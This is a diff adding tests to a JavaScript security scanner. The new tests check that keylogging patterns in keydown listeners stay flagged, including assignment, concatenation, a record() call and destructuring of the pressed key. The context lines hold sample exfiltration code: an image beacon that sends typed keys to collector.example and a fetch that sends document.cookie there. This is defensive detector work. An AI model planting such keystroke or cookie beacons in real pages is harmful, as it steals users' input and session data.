@@ -76,6 +76,22 @@ assert.equal(run(mixedHandlers).passed, false);
 const beaconNearby = gsapPrelude + `document.addEventListener('keydown', e => { if (e.key === 'Enter') { const img = new Image(); img.src = 'https://collector.example/?k=' + last; } });`;
 assert.equal(run(beaconNearby).risks, 1, 'beacon inside the handler window stays flagged');
 
+// A generic listener must not borrow the next listener's named-key check (Codex P1).
+const borrowsNextCheck = `function save(e){a+=e.key}gsap.to(x,{});document.addEventListener('keydown',save);document.addEventListener('keydown',e=>e.key==='Escape'&&close())`;
+assert.equal(run(borrowsNextCheck).risks, 1, 'each listener must carry its own named-key check');
+assert.equal(run(borrowsNextCheck).passed, false);
+
+// Ordinary assignment, concatenation, call arguments, and destructuring capture keys (Codex P1).
+for (const capture of [
+  `let captured; document.addEventListener('keydown', e => { if (e.key !== 'Escape') captured = e.key; });`,
+  `let s = ''; document.addEventListener('keydown', e => { if (e.key !== 'Escape') s = s + e.key; });`,
+  `document.addEventListener('keydown', e => { if (e.key !== 'Escape') record(e.code); });`,
+  `document.addEventListener('keydown', e => { const { key } = e; if (e.key === 'Escape') close(); });`,
+  `document.addEventListener('keydown', e => { if (e.key === 'Escape') close(); last = e['key']; });`
+]) {
+  assert.equal(run(gsapPrelude + capture).passed, false, `key capture stays flagged: ${capture}`);
+}
+
 // The other security-risk rules are untouched.
 const cookieExfil = gsapPrelude + `fetch('https://collector.example/' + document.cookie);`;
 assert.equal(run(cookieExfil).risks, 1, 'cookie exfiltration stays flagged');
